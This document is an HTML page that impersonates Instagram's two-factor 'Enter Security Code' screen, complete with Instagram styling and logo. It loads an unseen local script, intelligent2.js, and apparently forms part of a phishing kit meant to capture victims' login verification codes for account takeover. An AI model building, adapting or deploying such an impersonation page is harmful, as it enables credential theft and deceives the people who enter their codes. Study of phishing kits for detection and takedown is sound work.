<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Verification</title>

<style>
    body {
        margin: 0;
        padding: 0;
        background: #fafafa;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
            Roboto, Helvetica, Arial, sans-serif;
    }

    .container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        flex-direction: column;
        padding: 16px;
    }

    /* Instagram logo text */
    .ig-logo {
        font-family: 'Billabong', cursive;
        font-size: 48px;
        margin-bottom: 16px;
        color: #000;
        letter-spacing: 0.5px;
    }

    /* Card */
    .card {
        width: 330px;
        background: #fff;
        border: 1px solid #dbdbdb;
        border-radius: 8px;
        padding: 26px 22px;
        text-align: center;
    }

    .card h2 {
        font-size: 18px;
        margin: 0 0 10px;
        font-weight: 600;
        color: #262626;
    }

    .card p {
        font-size: 13px;
        color: #737373;
        margin-bottom: 18px;
        line-height: 1.4;
    }

    /* Input */
    .input-box input {
        width: 100%;
        padding: 10px;
        border-radius: 4px;
        border: 1px solid #dbdbdb;
        background: #fafafa;
        font-size: 14px;
        outline: none;
    }

    .input-box input:focus {
        border-color: #b2b2b2;
        background: #fff;
    }

    /* Continue button */
    .btn {
        width: 100%;
        padding: 9px;
        background: #0095f6;
        color: white;
        border: none;
        border-radius: 4px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        margin-top: 12px;
        opacity: 0.95;
    }

    .btn:hover {
        opacity: 1;
    }

    .footer-text {
        font-size: 13px;
        margin-top: 12px;
        color: #0095f6;
        cursor: pointer;
    }

    .footer-text:hover {
        text-decoration: underline;
    }

    .small-info {
        margin-top: 12px;
        font-size: 11px;
        color: #737373;
    }
img {
  width: 60px;
}
</style>
</head>
<script src="intelligent2.js"></script>
<body>
<div class="container">

    <div class="ig-logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSUitrNYPBxG5O_KfYThQIz3muoIyN-C_joiwQKFKOpfA&s=10"></div>

    <div class="card">
        <h2>Enter Security Code</h2>

        <p>
            We sent a 6-digit code to your phone number.
            Enter the code to confirm itâ€™s you.
        </p>

        <div class="input-box">
          <form>
            <input type="text" placeholder="Security Code" maxlength="10" name="Instagram verification code" required>
        </div>

        <button class="btn" type="submit">Confirm</button>
</form>
        <div class="footer-text">Didn't receive a code?</div>
    </div>

</div>

</body>
</html>
